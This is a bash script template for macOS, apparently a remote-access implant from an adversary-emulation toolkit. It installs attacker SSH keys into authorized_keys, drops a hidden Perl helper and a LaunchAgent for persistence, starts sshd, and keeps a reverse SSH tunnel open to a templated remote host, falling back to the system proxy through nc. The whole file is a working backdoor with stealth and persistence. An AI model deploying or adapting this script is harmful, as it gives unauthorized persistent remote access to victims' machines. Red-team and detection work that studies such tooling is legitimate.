#!/usr/bin/env bash
# Copyright (c) 2024, Oracle and/or its affiliates.

UMASK=002
umask $UMASK
NAME=$(basename "$0")

KEY="$HOME/.ssh/{{ PRIVATE_KEY_PATH_PLACEHOLDER }}"
HOSTKEY="$HOME/.ssh/{{ HOST_KEY_NAME }}"
FLOCKNAME="{{ FLOCK_NAME_PLACEHOLDER }}"
LAGENTNAME="{{ LAGENT_NAME_PLACEHOLDER }}"
chmod +x "$NAME"

if ! test -d "$HOME/Library/LaunchAgents/"; then
    mkdir -p "$HOME/Library/LaunchAgents/"
fi

if ! test -d "$HOME/.ssh/"; then
    mkdir -p "$HOME/.ssh/"
    chmod 700 "$HOME/.ssh/"
fi

if test -f "$KEY";then
    while true; do
        if curl --max-time 3 --output /dev/null --silent --head --fail "http://google.com" ; then
            ssh -o StrictHostKeyChecking=no -p {{ REMOTE_PLACEHOLDER }} -N -i $KEY {{ FACEPLANT }}-$USER@{{ FQDN_PLACEHOLDER }}
            /usr/sbin/sshd -h $HOSTKEY -p {{ SSHD_PORT }}
            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p {{ REMOTE_PLACEHOLDER }} -N -R {{ PORT_PLACEHOLDER }}:localhost:{{ SSHD_PORT }} -i $KEY flip@{{ FQDN_PLACEHOLDER }}

        else
            PROXY=$(networksetup -listallnetworkservices | sed '1d' | while IFS= read -r n; do networksetup -getwebproxy "$n" | awk '/Server:/ {server=$2} /Port:/ {port=$2; if (server != "") {print server ":" port; server=""}}'; done)
            ssh -o ProxyCommand="/usr/bin/nc -X connect -x $PROXY %h %p" -o StrictHostKeyChecking=no -p {{ REMOTE_PLACEHOLDER }} -N -i $KEY {{ FACEPLANT }}-$USER@{{ FQDN_PLACEHOLDER }}
            /usr/sbin/sshd -h $HOSTKEY -p {{ SSHD_PORT }}
            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ProxyCommand="/usr/bin/nc -X connect -x $PROXY %h %p" -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p {{ REMOTE_PLACEHOLDER }} -N -R {{ PORT_PLACEHOLDER }}:localhost:{{ SSHD_PORT }} -i $KEY flip@{{ FQDN_PLACEHOLDER }}
        fi
        sleep 10
    done
else

    echo "" >> "$HOME/.ssh/known_hosts"
    echo "{{ BACKFLIP_PUB_PLACEHOLDER }}"|base64 -d >> "$HOME/.ssh/known_hosts"
    echo "{{ PRIVATE_KEY_PLACEHOLDER }}"|base64 -d > "$KEY"
    echo "{{ HOST_KEY_PLACEHOLDER }}"|base64 -d > "$HOSTKEY"
    echo "" >> "$HOME/.ssh/authorized_keys"
    echo "{{ PUBLIC_KEY_PLACEHOLDER }}"|base64 -d >> "$HOME/.ssh/authorized_keys"
    echo "{{ FLOCK_CODE_PLACEHOLDER }}" |base64 -d > "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
    chmod 600 "$KEY" && chmod 644 "$HOME/.ssh/authorized_keys" && chmod +x "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
    chmod 600 "$HOSTKEY"
    echo "{{ LAGENT_XML_PLACEHOLDER }}"|base64 -d >$HOME/Library/LaunchAgents/$LAGENTNAME.plist
    sed -i '' "s/{{ TARGET_USER }}/${USER}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
    sed -i '' "s/{{ IMAGINARY_PAYLOAD_NAME }}/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
    mv "$NAME" "$HOME/Library/LaunchAgents/"
    launchctl bootstrap gui/$UID/ "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
fi
